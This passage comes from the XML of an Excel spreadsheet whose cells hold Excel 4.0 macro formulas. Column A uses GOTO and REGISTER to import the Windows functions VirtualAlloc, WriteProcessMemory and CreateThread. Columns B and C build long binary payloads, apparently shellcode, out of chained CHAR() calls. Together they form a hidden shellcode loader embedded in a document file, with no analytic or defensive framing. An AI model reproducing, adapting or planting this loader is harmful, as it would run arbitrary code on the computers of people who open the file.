HAR(232)&amp;CHAR(72)&amp;CHAR(31)&amp;CHAR(255)&amp;CHAR(21)&amp;CHAR(124)&amp;CHAR(62)&amp;CHAR(122)&amp;CHAR(76)&amp;CHAR(61)&amp;CHAR(218)&amp;CHAR(149)&amp;CHAR(166)&amp;CHAR(134)&amp;CHAR(246)&amp;CHAR(36)&amp;CHAR(111)&amp;CHAR(57)&amp;CHAR(187)&amp;CHAR(177)&amp;CHAR(235)&amp;CHAR(132)&amp;CHAR(61)&amp;CHAR(12)&amp;CHAR(137)&amp;CHAR(111)&amp;CHAR(253)&amp;CHAR(202)&amp;CHAR(176)&amp;CHAR(137)&amp;CHAR(110)&amp;CHAR(54)&amp;CHAR(246)&amp;CHAR(60)&amp;CHAR(123)&amp;CHAR(75)&amp;CHAR(196)&amp;CHAR(181)&amp;CHAR(192)&amp;CHAR(20)&amp;CHAR(15)&amp;CHAR(20)&amp;CHAR(230)&amp;CHAR(218)&amp;CHAR(62)&amp;CHAR(167)&amp;CHAR(7)&amp;CHAR(152)&amp;CHAR(201)&amp;CHAR(90)&amp;CHAR(181)&amp;CHAR(183)&amp;CHAR(243)&amp;CHAR(109)&amp;CHAR(203)&amp;CHAR(67)&amp;CHAR(162)&amp;CHAR(58)&amp;CHAR(100)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(115)&amp;CHAR(83)&amp;CHAR(68)&amp;CHAR(57)&amp;CHAR(64)&amp;CHAR(59)&amp;CHAR(81)&amp;CHAR(252)&amp;CHAR(238)&amp;CHAR(146)&amp;CHAR(94)&amp;CHAR(167)&amp;CHAR(82)&amp;CHAR(244)&amp;CHAR(11)&amp;CHAR(253)&amp;CHAR(31)&amp;CHAR(11)&amp;CHAR(114)&amp;CHAR(200)&amp;CHAR(122)&amp;CHAR(217)</f>
        <v>h_x0017__x0004__x000F_¬ÅãÖÅ°_x0018_Ù¦‚µ1_x000E_ˆ_x000D_ÈŠvPl3gò¥]áS],MºÖ{òÖuJóÌs_x0014_–_x0007_Û$™_x0013_â^ièQÖ%†u+_x0003_
ÑšÔòñ_x000B_6âæÑ_x0013_k!CŸÍb0£_x000D_à¸qóåšn™Þaî{9SÖz––ú_x0008_£\y}ûÆ4¤ÿtwFŠàªæ…l_x0007_wn×½ˆ_x001C_j¯·_x000D_n5ÇÒÀ³ïlI®_x000F_(\R8”_x0010_þe#õq_x0015_Z?‹KNtÞUA#w×³­èH_x001F_ÿ_x0015_|&gt;zL=Ú•¦†ö$o9»±ë„=_x000C_‰oýÊ°‰n6ö&lt;{KÄµÀ_x0014__x000F__x0014_æÚ&gt;§_x0007_˜ÉZµ·ómËC¢:d†BsSD9@;Qüî’^§Rô_x000B_ý_x001F__x000B_rÈzÙ</v>
      </c>
      <c r="C4" t="str">
        <f>CHAR(39)&amp;CHAR(72)&amp;CHAR(45)&amp;CHAR(248)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(226)&amp;CHAR(244)&amp;CHAR(135)</f>
        <v>'H-øÿÿÿâô‡</v>
      </c>
    </row>
    <row r="5" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A5" t="b">
        <f>GOTO(A6)</f>
        <v>1</v>
      </c>
      <c r="B5" t="str">
        <f>CHAR(158)&amp;CHAR(196)&amp;CHAR(156)&amp;CHAR(77)&amp;CHAR(63)&amp;CHAR(157)&amp;CHAR(102)&amp;CHAR(7)&amp;CHAR(79)&amp;CHAR(168)&amp;CHAR(179)&amp;CHAR(20)&amp;CHAR(35)&amp;CHAR(130)&amp;CHAR(52)&amp;CHAR(246)&amp;CHAR(134)&amp;CHAR(246)&amp;CHAR(42)&amp;CHAR(53)&amp;CHAR(61)&amp;CHAR(8)&amp;CHAR(82)&amp;CHAR(34)&amp;CHAR(25)&amp;CHAR(118)&amp;CHAR(94)&amp;CHAR(231)&amp;CHAR(228)&amp;CHAR(156)&amp;CHAR(181)&amp;CHAR(27)&amp;CHAR(93)&amp;CHAR(35)&amp;CHAR(78)&amp;CHAR(153)&amp;CHAR(237)&amp;CHAR(2)&amp;CHAR(114)&amp;CHAR(33)&amp;CHAR(238)&amp;CHAR(138)&amp;CHAR(125)&amp;CHAR(83)&amp;CHAR(89)&amp;CHAR(2)&amp;CHAR(28)&amp;CHAR(149)&amp;CHAR(80)&amp;CHAR(46)&amp;CHAR(82)&amp;CHAR(87)&amp;CHAR(216)&amp;CHAR(42)&amp;CHAR(209)&amp;CHAR(68)&amp;CHAR(168)&amp;CHAR(190)&amp;CHAR(58)&amp;CHAR(116)&amp;CHAR(130)&amp;CHAR(54)&amp;CHAR(28)&amp;CHAR(169)&amp;CHAR(24)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(80)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(213)&amp;CHAR(112)&amp;CHAR(157)&amp;CHAR(55)&amp;CHAR(189)&amp;CHAR(13)&amp;CHAR(28)&amp;CHAR(15)&amp;CHAR(226)&amp;CHAR(44)&amp;CHAR(100)&amp;CHAR(38)&amp;CHAR(246)&amp;CHAR(57)&amp;CHAR(190)&amp;CHAR(206)&amp;CHAR(251)&amp;CHAR(101)&amp;CHAR(114)&amp;CHAR(207)&amp;CHAR(41)&amp;CHAR(33)&amp;CHAR(191)&amp;CHAR(228)&amp;CHAR(186)&amp;CHAR(53)&amp;CHAR(170)&amp;CHAR(154)&amp;CHAR(28)&amp;CHAR(221)&amp;CHAR(177)&amp;CHAR(56)&amp;CHAR(203)&amp;CHAR(198)&amp;CHAR(33)&amp;CHAR(228)&amp;CHAR(29)&amp;CHAR(19)&amp;CHAR(104)&amp;CHAR(199)&amp;CHAR(113)&amp;CHAR(109)&amp;CHAR(46)&amp;CHAR(130)&amp;CHAR(255)&amp;CHAR(24)&amp;CHAR(32)&amp;CHAR(129)&amp;CHAR(227)&amp;CHAR(180)&amp;CHAR(203)&amp;CHAR(31)&amp;CHAR(22)&amp;CHAR(139)&amp;CHAR(56)&amp;CHAR(237)&amp;CHAR(81)&amp;CHAR(87)&amp;CHAR(161)&amp;CHAR(204)&amp;CHAR(8)&amp;CHAR(226)&amp;CHAR(1)&amp;CHAR(193)&amp;CHAR(208)&amp;CHAR(66)&amp;CHAR(84)&amp;CHAR(125)&amp;CHAR(41)&amp;CHAR(121)&amp;CHAR(147)&amp;CHAR(204)&amp;CHAR(118)&amp;CHAR(1)&amp;CHAR(124)&amp;CHAR(169)&amp;CHAR(228)&amp;CHAR(90)&amp;CHAR(171)&amp;CHAR(143)&amp;CHAR(23)&amp;CHAR(111)&amp;CHAR(204)&amp;CHAR(81)&amp;CHAR(78)&amp;CHAR(30)&amp;CHAR(20)&amp;CHAR(99)&amp;CHAR(232)&amp;CHAR(78)&amp;CHAR(215)&amp;CHAR(215)&amp;CHAR(195)&amp;CHAR(51)&amp;CHAR(193)&amp;CHAR(186)&amp;CHAR(19)&amp;CHAR(64)&amp;CHAR(5)&amp;CHAR(50)&amp;CHAR(80)&amp;CHAR(88)&amp;CHAR(218)&amp;CHAR(35)&amp;CHAR(95)&amp;CHAR(7)&amp;CHAR(24)&amp;CHAR(24)&amp;CHAR(243)&amp;CHAR(199)&amp;CHAR(214)&amp;CHAR(97)&amp;CHAR(6)&amp;CHAR(139)&amp;CHAR(58)&amp;CHAR(20)&amp;CHAR(148)&amp;CHAR(10)&amp;CHAR(220)&amp;CHAR(218)&amp;CHAR(140)&amp;CHAR(83)&amp;CHAR(86)&amp;CHAR(10)&amp;CHAR(246)&amp;CHAR(172)&amp;CHAR(243)&amp;CHAR(61)&amp;CHAR(63)&amp;CHAR(144)&amp;CHAR(14)&amp;CHAR(86)&amp;CHAR(97)&amp;CHAR(230)&amp;CHAR(127)&amp;CHAR(251)&amp;CHAR(208)&amp;CHAR(103)&amp;CHAR(61)&amp;CHAR(92)&amp;CHAR(126)&amp;CHAR(4)&amp;CHAR(179)&amp;CHAR(2)&amp;CHAR(125)&amp;CHAR(94)&amp;CHAR(191)&amp;CHAR(93)&amp;CHAR(224)&amp;CHAR(207)&amp;CHAR(130)&amp;CHAR(72)&amp;CHAR(9)&amp;CHAR(215)&amp;CHAR(118)&amp;CHAR(119)&amp;CHAR(121)&amp;CHAR(54)&amp;CHAR(215)&amp;CHAR(255)&amp;CHAR(210)&amp;CHAR(174)&amp;CHAR(137)&amp;CHAR(23)&amp;CHAR(49)&amp;CHAR(43)&amp;CHAR(33)&amp;CHAR(14)&amp;CHAR(18)&amp;CHAR(128)&amp;CHAR(93)&amp;CHAR(166)&amp;CHAR(195)&amp;CHAR(138)&amp;CHAR(86)&amp;CHAR(208)&amp;CHAR(76)&amp;CHAR(19)&amp;CHAR(161)&amp;CHAR(160)&amp;CHAR(67)&amp;CHAR(75)&amp;CHAR(74)&amp;CHAR(175)&amp;CHAR(47)</f>
        <v>žÄœM?f_x0007_O¨³_x0014_#‚4ö†ö*5=_x0008_R"_x0019_v^çäœµ_x001B_]#N™í_x0002_r!îŠ}SY_x0002__x001C_•P.RWØ*ÑD¨¾:t‚6_x001C_©_x0018__x0011_ŽPÖÈÕp7½_x000D__x001C__x000F_â,d&amp;ö9¾ÎûerÏ)!¿äº5ªš_x001C_Ý±8ËÆ!ä_x001D__x0013_hÇqm.‚ÿ_x0018_ ã´Ë_x001F__x0016_‹8íQW¡Ì_x0008_â_x0001_ÁÐBT})y“Ìv_x0001_|©äZ«_x0017_oÌQN_x001E__x0014_cèN××Ã3Áº_x0013_@_x0005_2PXÚ#__x0007__x0018__x0018_óÇÖa_x0006_‹:_x0014_”
ÜÚŒSV
ö¬ó=?_x000E_VaæûÐg=\~_x0004_³_x0002_}^¿]àÏ‚H	×vwy6×ÿÒ®‰_x0017_1+!_x000E__x0012_€]¦ÃŠVÐL_x0013_¡ CKJ¯/</v>
      </c>
      <c r="C5" t="str">
        <f>CHAR(189)&amp;CHAR(93)&amp;CHAR(174)&amp;CHAR(173)&amp;CHAR(105)&amp;CHAR(46)&amp;CHAR(207)&amp;CHAR(234)&amp;CHAR(14)&amp;CHAR(177)</f>
        <v>½]®­i.Ïê_x000E_±</v>
      </c>
    </row>
    <row r="6" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A6">
        <f>REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)</f>
        <v>-647561216</v>
      </c>
      <c r="B6" t="str">
        <f>CHAR(80)&amp;CHAR(38)&amp;CHAR(26)&amp;CHAR(21)&amp;CHAR(171)&amp;CHAR(44)&amp;CHAR(92)&amp;CHAR(165)&amp;CHAR(231)&amp;CHAR(24)&amp;CHAR(212)&amp;CHAR(207)&amp;CHAR(37)&amp;CHAR(176)&amp;CHAR(51)&amp;CHAR(165)&amp;CHAR(157)&amp;CHAR(19)&amp;CHAR(50)&amp;CHAR(128)&amp;CHAR(149)&amp;CHAR(60)&amp;CHAR(103)&amp;CHAR(34)&amp;CHAR(155)&amp;CHAR(19)&amp;CHAR(128)&amp;CHAR(155)&amp;CHAR(103)&amp;CHAR(101)&amp;CHAR(103)&amp;CHAR(57)&amp;CHAR(114)&amp;CHAR(139)&amp;CHAR(162)&amp;CHAR(176)&amp;CHAR(159)&amp;CHAR(163)&amp;CHAR(143)&amp;CHAR(47)&amp;CHAR(200)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(154)&amp;CHAR(202)&amp;CHAR(1)&amp;CHAR(242)&amp;CHAR(89)&amp;CHAR(54)&amp;CHAR(26)&amp;CHAR(53)&amp;CHAR(187)&amp;CHAR(1)&amp;CHAR(27)&amp;CHAR(215)&amp;CHAR(208)&amp;CHAR(80)&amp;CHAR(101)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(17)&amp;CHAR(46)&amp;CHAR(33)&amp;CHAR(253)&amp;CHAR(29)&amp;CHAR(46)&amp;CHAR(163)&amp;CHAR(138)&amp;CHAR(202)&amp;CHAR(95)&amp;CHAR(154)&amp;CHAR(143)&amp;CHAR(67)&amp;CHAR(90)&amp;CHAR(96)&amp;CHAR(179)&amp;CHAR(28)&amp;CHAR(58)&amp;CHAR(102)&amp;CHAR(236)&amp;CHAR(188)&amp;CHAR(137)&amp;CHAR(7)&amp;CHAR(27)&amp;CHAR(29)&amp;CHAR(61)&amp;CHAR(228)&amp;CHAR(231)&amp;CHAR(151)&amp;CHAR(61)&amp;CHAR(139)&amp;CHAR(57)&amp;CHAR(81)&amp;CHAR(8)&amp;CHAR(185)&amp;CHAR(37)&amp;CHAR(64)&amp;CHAR(210)&amp;CHAR(127)&amp;CHAR(131)&amp;CHAR(89)&amp;CHAR(81)&amp;CHAR(99)&amp;CHAR(30)&amp;CHAR(233)&amp;CHAR(138)&amp;CHAR(119)&amp;CHAR(175)&amp;CHAR(239)&amp;CHAR(32)&amp;CHAR(232)&amp;CHAR(238)&amp;CHAR(120)&amp;CHAR(65)&amp;CHAR(50)&amp;CHAR(66)&amp;CHAR(21)&amp;CHAR(219)&amp;CHAR(131)&amp;CHAR(255)&amp;CHAR(91)&amp;CHAR(229)&amp;CHAR(163)&amp;CHAR(155)&amp;CHAR(90)&amp;CHAR(77)&amp;CHAR(118)&amp;CHAR(21)&amp;CHAR(7)&amp;CHAR(253)&amp;CHAR(180)&amp;CHAR(18)&amp;CHAR(167)&amp;CHAR(47)&amp;CHAR(114)&amp;CHAR(37)&amp;CHAR(26)&amp;CHAR(90)&amp;CHAR(104)&amp;CHAR(179)&amp;CHAR(79)&amp;CHAR(110)&amp;CHAR(99)&amp;CHAR(169)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(55)&amp;CHAR(164)&amp;CHAR(134)&amp;CHAR(181)&amp;CHAR(218)&amp;CHAR(51)&amp;CHAR(172)&amp;CHAR(222)&amp;CHAR(41)&amp;CHAR(25)&amp;CHAR(50)&amp;CHAR(16)&amp;CHAR(24)&amp;CHAR(148)&amp;CHAR(233)&amp;CHAR(46)&amp;CHAR(74)&amp;CHAR(179)&amp;CHAR(46)&amp;CHAR(98)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(7)&amp;CHAR(125)&amp;CHAR(141)&amp;CHAR(226)&amp;CHAR(51)&amp;CHAR(70)&amp;CHAR(209)&amp;CHAR(246)&amp;CHAR(209)&amp;CHAR(135)&amp;CHAR(26)&amp;CHAR(52)&amp;CHAR(96)&amp;CHAR(35)&amp;CHAR(7)&amp;CHAR(38)&amp;CHAR(233)&amp;CHAR(238)&amp;CHAR(114)&amp;CHAR(240)&amp;CHAR(70)&amp;CHAR(190)&amp;CHAR(126)&amp;CHAR(63)&amp;CHAR(17)&amp;CHAR(184)&amp;CHAR(85)&amp;CHAR(184)&amp;CHAR(225)&amp;CHAR(79)&amp;CHAR(162)&amp;CHAR(123)&amp;CHAR(134)&amp;CHAR(185)&amp;CHAR(57)&amp;CHAR(231)&amp;CHAR(53)&amp;CHAR(12)&amp;CHAR(194)&amp;CHAR(33)&amp;CHAR(122)&amp;CHAR(206)&amp;CHAR(1)&amp;CHAR(39)&amp;CHAR(205)&amp;CHAR(255)&amp;CHAR(79)&amp;CHAR(2)&amp;CHAR(192)&amp;CHAR(174)&amp;CHAR(106)&amp;CHAR(227)&amp;CHAR(133)&amp;CHAR(203)&amp;CHAR(79)&amp;CHAR(40)&amp;CHAR(91)&amp;CHAR(22)&amp;CHAR(158)&amp;CHAR(25)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(230)&amp;CHAR(114)&amp;CHAR(92)&amp;CHAR(73)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(159)&amp;CHAR(102)&amp;CHAR(203)&amp;CHAR(200)&amp;CHAR(23)&amp;CHAR(32)&amp;CHAR(68)&amp;CHAR(169)&amp;CHAR(231)&amp;CHAR(135)&amp;CHAR(234)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(79)&amp;CHAR(15)&amp;CHAR(58)&amp;CHAR(144)&amp;CHAR(30)&amp;CHAR(62)</f>
        <v>P&amp;_x001A__x0015_«,\¥ç_x0018_ÔÏ%°3¥_x0013_2€•&lt;g"›_x0013_€›geg9r‹¢°Ÿ£/ÈFšÊ_x0001_òY6_x001A_5»_x0001__x001B_×ÐPe&amp;_x0011__x0011_.!ý_x001D_.£ŠÊ_šCZ`³_x001C_:fì¼‰_x0007__x001B__x001D_=äç—=‹9Q_x0008_¹%@ÒƒYQc_x001E_éŠw¯ï èîxA2B_x0015_Ûƒÿ[å£›ZMv_x0015__x0007_ý´_x0012_§/r%_x001A_Zh³Onc©Ë7¤†µÚ3¬Þ)_x0019_2_x0010__x0018_”é.J³.b&gt;°_x0007_}â3FÑöÑ‡_x001A_4`#_x0007_&amp;éîrðF¾~?_x0011_¸U¸áO¢{†¹9ç5_x000C_Â!zÎ_x0001_'ÍÿO_x0002_À®jã…ËO([_x0016_ž_x0019_!-ær\IQéŸfËÈ_x0017_ D©ç‡êQýO_x000F_:_x001E_&gt;</v>
      </c>
      <c r="C6" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(38)&amp;CHAR(61)&amp;CHAR(231)&amp;CHAR(119)&amp;CHAR(56)&amp;CHAR(38)&amp;CHAR(128)</f>
        <v>ÖÈi&amp;=çw8&amp;€</v>
      </c>
    </row>
    <row r="7" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A7">
        <f>REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)</f>
        <v>-151322623</v>
      </c>
      <c r="B7" t="str">
        <f>CHAR(69)&amp;CHAR(78)&amp;CHAR(177)&amp;CHAR(110)&amp;CHAR(167)&amp;CHAR(183)&amp;CHAR(122)&amp;CHAR(45)&amp;CHAR(206)&amp;CHAR(140)&amp;CHAR(102)&amp;CHAR(54)&amp;CHAR(188)&amp;CHAR(17)&amp;CHAR(162)&amp;CHAR(232)&amp;CHAR(100)&amp;CHAR(149)&amp;CHAR(37)&amp;CHAR(84)&amp;CHAR(226)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(102)&amp;CHAR(253)&amp;CHAR(124)&amp;CHAR(3)&amp;CHAR(245)&amp;CHAR(248)&amp;CHAR(62)&amp;CHAR(128)&amp;CHAR(95)&amp;CHAR(112)&amp;CHAR(94)&amp;CHAR(212)&amp;CHAR(32)&amp;CHAR(113)&amp;CHAR(104)&amp;CHAR(132)&amp;CHAR(25)&amp;CHAR(168)&amp;CHAR(137)&amp;CHAR(225)&amp;CHAR(40)&amp;CHAR(124)&amp;CHAR(21)&amp;CHAR(192)&amp;CHAR(69)&amp;CHAR(26)&amp;CHAR(114)&amp;CHAR(254)&amp;CHAR(245)&amp;CHAR(130)&amp;CHAR(223)&amp;CHAR(26)&amp;CHAR(219)&amp;CHAR(246)&amp;CHAR(70)&amp;CHAR(77)&amp;CHAR(163)&amp;CHAR(92)&amp;CHAR(23)&amp;CHAR(241)&amp;CHAR(95)&amp;CHAR(187)&amp;CHAR(59)&amp;CHAR(236)&amp;CHAR(33)&amp;CHAR(67)&amp;CHAR(212)&amp;CHAR(182)&amp;CHAR(68)&amp;CHAR(77)&amp;CHAR(179)&amp;CHAR(218)&amp;CHAR(215)&amp;CHAR(220)&amp;CHAR(12)&amp;CHAR(126)&amp;CHAR(96)&amp;CHAR(73)&amp;CHAR(147)&amp;CHAR(38)&amp;CHAR(236)&amp;CHAR(67)&amp;CHAR(53)&amp;CHAR(188)&amp;CHAR(22)&amp;CHAR(141)&amp;CHAR(237)&amp;CHAR(183)&amp;CHAR(55)&amp;CHAR(254)&amp;CHAR(231)&amp;CHAR(230)&amp;CHAR(21)&amp;CHAR(70)&amp;CHAR(183)&amp;CHAR(171)&amp;CHAR(171)&amp;CHAR(187)&amp;CHAR(184)&amp;CHAR(113)&amp;CHAR(19)&amp;CHAR(22)&amp;CHAR(60)&amp;CHAR(17)&amp;CHAR(146)&amp;CHAR(167)&amp;CHAR(14)&amp;CHAR(81)&amp;CHAR(113)&amp;CHAR(166)&amp;CHAR(15)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(253)&amp;CHAR(251)&amp;CHAR(241)&amp;CHAR(156)&amp;CHAR(202)&amp;CHAR(152)&amp;CHAR(194)&amp;CHAR(181)&amp;CHAR(172)&amp;CHAR(118)&amp;CHAR(224)&amp;CHAR(140)&amp;CHAR(192)&amp;CHAR(104)&amp;CHAR(191)&amp;CHAR(74)&amp;CHAR(62)&amp;CHAR(98)&amp;CHAR(185)&amp;CHAR(112)&amp;CHAR(162)&amp;CHAR(85)&amp;CHAR(109)&amp;CHAR(205)&amp;CHAR(108)&amp;CHAR(109)&amp;CHAR(255)&amp;CHAR(246)&amp;CHAR(159)&amp;CHAR(78)&amp;CHAR(178)&amp;CHAR(49)&amp;CHAR(149)&amp;CHAR(244)&amp;CHAR(255)&amp;CHAR(253)&amp;CHAR(103)&amp;CHAR(213)&amp;CHAR(80)&amp;CHAR(72)&amp;CHAR(70)&amp;CHAR(142)&amp;CHAR(152)&amp;CHAR(209)&amp;CHAR(148)&amp;CHAR(159)&amp;CHAR(215)&amp;CHAR(62)&amp;CHAR(32)&amp;CHAR(10)&amp;CHAR(196)&amp;CHAR(69)&amp;CHAR(12)&amp;CHAR(55)&amp;CHAR(26)&amp;CHAR(192)&amp;CHAR(107)&amp;CHAR(165)&amp;CHAR(6)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(18)&amp;CHAR(44)&amp;CHAR(186)&amp;CHAR(131)&amp;CHAR(130)&amp;CHAR(161)&amp;CHAR(114)&amp;CHAR(145)&amp;CHAR(138)&amp;CHAR(154)&amp;CHAR(162)&amp;CHAR(94)&amp;CHAR(39)&amp;CHAR(247)&amp;CHAR(139)&amp;CHAR(81)&amp;CHAR(242)&amp;CHAR(98)&amp;CHAR(205)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(38)&amp;CHAR(69)&amp;CHAR(132)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(66)&amp;CHAR(53)&amp;CHAR(143)&amp;CHAR(54)&amp;CHAR(53)&amp;CHAR(15)&amp;CHAR(212)&amp;CHAR(156)&amp;CHAR(136)&amp;CHAR(64)&amp;CHAR(138)&amp;CHAR(168)&amp;CHAR(116)&amp;CHAR(70)&amp;CHAR(183)&amp;CHAR(183)&amp;CHAR(173)&amp;CHAR(165)&amp;CHAR(28)&amp;CHAR(49)&amp;CHAR(179)&amp;CHAR(205)&amp;CHAR(63)&amp;CHAR(13)&amp;CHAR(214)&amp;CHAR(58)&amp;CHAR(111)&amp;CHAR(163)&amp;CHAR(221)&amp;CHAR(182)&amp;CHAR(141)&amp;CHAR(21)&amp;CHAR(26)&amp;CHAR(44)&amp;CHAR(200)&amp;CHAR(215)&amp;CHAR(190)&amp;CHAR(128)&amp;CHAR(74)&amp;CHAR(8)&amp;CHAR(200)&amp;CHAR(127)&amp;CHAR(98)&amp;CHAR(158)&amp;CHAR(112)&amp;CHAR(13)&amp;CHAR(102)&amp;CHAR(201)&amp;CHAR(123)&amp;CHAR(200)&amp;CHAR(123)&amp;CHAR(241)</f>
        <v>EN±n§·z-ÎŒf6¼_x0011_¢èd•%Tâ×–fý|_x0003_õø&gt;€_p^Ô qh„_x0019_¨‰á(|_x0015_ÀE_x001A_rþõ‚ß_x001A_ÛöFM£\_x0017_ñ_»;ì!CÔ¶DM³Ú×Ü_x000C_~`I“&amp;ìC5¼_x0016_í·7þçæ_x0015_F·««»¸q_x0013__x0016_&lt;_x0011_’§_x000E_Qq¦_x000F_A%ýûñœÊ˜Âµ¬vàŒÀh¿J&gt;b¹p¢UmÍlmÿöŸN²1•ôÿýgÕPHFŽ˜Ñ”Ÿ×&gt; 
ÄE_x000C_7_x001A_Àk¥_x0006_ÎA_x0012_,ºƒ‚¡r‘Šš¢^'÷‹QòbÍ_x0002__x0005_&amp;E„
_x0005_B565_x000F_Ôœˆ@Š¨tF··­¥_x001C_1³Í?_x000D_Ö:o£Ý¶_x0015__x001A_,È×¾€J_x0008_Èbžp_x000D_fÉ{È{ñ</v>
      </c>
      <c r="C7" t="str">
        <f>CHAR(172)&amp;CHAR(176)&amp;CHAR(240)&amp;CHAR(200)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(158)&amp;CHAR(69)&amp;CHAR(44)&amp;CHAR(79)</f>
        <v>¬°ðÈ&gt;±žE,O</v>
      </c>
    </row>
    <row r="8" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A8">
        <f>REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)</f>
        <v>-1680080894</v>
      </c>
      <c r="B8" t="str">
        <f>CHAR(94)&amp;CHAR(167)&amp;CHAR(254)&amp;CHAR(23)&amp;CHAR(207)&amp;CHAR(23)&amp;CHAR(229)&amp;CHAR(170)&amp;CHAR(236)&amp;CHAR(121)&amp;CHAR(72)&amp;CHAR(140)&amp;CHAR(149)&amp;CHAR(195)&amp;CHAR(228)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(48)&amp;CHAR(11)&amp;CHAR(56)&amp;CHAR(143)&amp;CHAR(234)&amp;CHAR(137)&amp;CHAR(131)&amp;CHAR(115)&amp;CHAR(148)&amp;CHAR(106)&amp;CHAR(182)&amp;CHAR(247)&amp;CHAR(104)&amp;CHAR(205)&amp;CHAR(32)&amp;CHAR(202)&amp;CHAR(40)&amp;CHAR(64)&amp;CHAR(244)&amp;CHAR(61)&amp;CHAR(228)&amp;CHAR(184)&amp;CHAR(137)&amp;CHAR(36)&amp;CHAR(159)&amp;CHAR(74)&amp;CHAR(214)&amp;CHAR(172)&amp;CHAR(32)&amp;CHAR(147)&amp;CHAR(157)&amp;CHAR(197)&amp;CHAR(47)&amp;CHAR(181)&amp;CHAR(159)&amp;CHAR(203)&amp;CHAR(64)&amp;CHAR(160)&amp;CHAR(156)&amp;CHAR(153)&amp;CHAR(82)&amp;CHAR(216)&amp;CHAR(254)&amp;CHAR(243)&amp;CHAR(239)&amp;CHAR(36)&amp;CHAR(177)&amp;CHAR(58)&amp;CHAR(126)&amp;CHAR(118)&amp;CHAR(34)&amp;CHAR(165)&amp;CHAR(136)&amp;CHAR(176)&amp;CHAR(84)&amp;CHAR(110)&amp;CHAR(37)&amp;CHAR(15)&amp;CHAR(63)&amp;CHAR(95)&amp;CHAR(238)&amp;CHAR(10)&amp;CHAR(153)&amp;CHAR(169)&amp;CHAR(129)&amp;CHAR(117)&amp;CHAR(15)&amp;CHAR(146)&amp;CHAR(44)&amp;CHAR(228)&amp;CHAR(20)&amp;CHAR(226)&amp;CHAR(195)&amp;CHAR(29)&amp;CHAR(160)&amp;CHAR(125)&amp;CHAR(191)&amp;CHAR(210)&amp;CHAR(107)&amp;CHAR(19)&amp;CHAR(91)&amp;CHAR(126)&amp;CHAR(64)&amp;CHAR(26)&amp;CHAR(174)&amp;CHAR(130)&amp;CHAR(38)&amp;CHAR(221)&amp;CHAR(119)&amp;CHAR(30)&amp;CHAR(38)&amp;CHAR(191)&amp;CHAR(197)&amp;CHAR(117)&amp;CHAR(245)&amp;CHAR(66)&amp;CHAR(176)&amp;CHAR(186)&amp;CHAR(195)&amp;CHAR(4)&amp;CHAR(169)&amp;CHAR(89)&amp;CHAR(244)&amp;CHAR(238)&amp;CHAR(106)&amp;CHAR(27)&amp;CHAR(101)&amp;CHAR(74)&amp;CHAR(240)&amp;CHAR(95)&amp;CHAR(89)&amp;CHAR(17)&amp;CHAR(200)&amp;CHAR(127)&amp;CHAR(230)&amp;CHAR(84)&amp;CHAR(139)&amp;CHAR(159)&amp;CHAR(150)&amp;CHAR(41)&amp;CHAR(78)&amp;CHAR(169)&amp;CHAR(205)&amp;CHAR(180)&amp;CHAR(20)&amp;CHAR(161)&amp;CHAR(65)&amp;CHAR(109)&amp;CHAR(74)&amp;CHAR(142)&amp;CHAR(247)&amp;CHAR(173)&amp;CHAR(46)&amp;CHAR(72)&amp;CHAR(70)&amp;CHAR(202)&amp;CHAR(220)&amp;CHAR(16)&amp;CHAR(205)&amp;CHAR(37)&amp;CHAR(213)&amp;CHAR(183)&amp;CHAR(154)&amp;CHAR(139)&amp;CHAR(21)&amp;CHAR(171)&amp;CHAR(175)&amp;CHAR(18)&amp;CHAR(18)&amp;CHAR(34)&amp;CHAR(174)&amp;CHAR(100)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(132)&amp;CHAR(235)&amp;CHAR(121)&amp;CHAR(140)&amp;CHAR(156)&amp;CHAR(41)&amp;CHAR(48)&amp;CHAR(213)&amp;CHAR(140)&amp;CHAR(232)&amp;CHAR(11)&amp;CHAR(163)&amp;CHAR(196)&amp;CHAR(209)&amp;CHAR(127)&amp;CHAR(74)&amp;CHAR(58)&amp;CHAR(109)&amp;CHAR(8)&amp;CHAR(16)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(78)&amp;CHAR(134)&amp;CHAR(140)&amp;CHAR(91)&amp;CHAR(106)&amp;CHAR(194)&amp;CHAR(133)&amp;CHAR(155)&amp;CHAR(43)&amp;CHAR(10)&amp;CHAR(66)&amp;CHAR(181)&amp;CHAR(172)&amp;CHAR(166)&amp;CHAR(181)&amp;CHAR(219)&amp;CHAR(204)&amp;CHAR(224)&amp;CHAR(157)&amp;CHAR(200)&amp;CHAR(151)&amp;CHAR(156)&amp;CHAR(85)&amp;CHAR(212)&amp;CHAR(25)&amp;CHAR(138)&amp;CHAR(255)&amp;CHAR(142)&amp;CHAR(141)&amp;CHAR(64)&amp;CHAR(141)&amp;CHAR(200)&amp;CHAR(138)&amp;CHAR(238)&amp;CHAR(171)&amp;CHAR(40)&amp;CHAR(64)&amp;CHAR(69)&amp;CHAR(211)&amp;CHAR(107)&amp;CHAR(12)&amp;CHAR(72)&amp;CHAR(201)&amp;CHAR(69)&amp;CHAR(110)&amp;CHAR